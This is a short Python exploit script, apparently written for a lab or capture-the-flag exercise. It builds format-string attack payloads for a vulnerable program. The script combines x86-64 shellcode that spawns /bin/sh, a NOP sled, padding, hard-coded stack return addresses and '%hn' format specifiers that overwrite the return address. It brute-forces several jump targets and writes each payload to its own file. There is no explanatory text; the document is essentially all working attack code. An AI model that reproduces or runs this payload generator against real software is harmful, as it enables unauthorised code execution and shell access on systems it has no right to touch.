#!/usr/bin/env python3
import struct

# Constants
shellcode = (
    b"\x48\x31\xc0\x50"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x53\x48\x89\xe7\x50\x57\x48\x89\xe6"
    b"\xb0\x3b\x0f\x05"
)
nop_sled = b"\x90" * 150
buffer_size = 200

# Return address overwrite target
retaddr_low  = b"\x68\xdc\xff\xff\xff\x7f\x00\x00"
retaddr_high = b"\x6a\xdc\xff\xff\xff\x7f\x00\x00"

# Try jump addresses from 0xe0a0 to 0xe110 (step 16)
for val1 in range(0xe0a0, 0xe110, 0x10):
    val2 = 0xffff
    diff = val2 - val1
    fmt = f"%{val1}x%13$hn%{diff}x%14$hn".encode()

    body = nop_sled + shellcode
    padding = b"A" * (buffer_size - len(body))
    payload = body + padding + retaddr_low + retaddr_high + fmt

    with open(f"exploit_{val1:x}.bin", "wb") as f:
        f.write(payload)

    print(f"[+] Written: exploit_{val1:x}.bin (Jump: 0x{val1:x})")

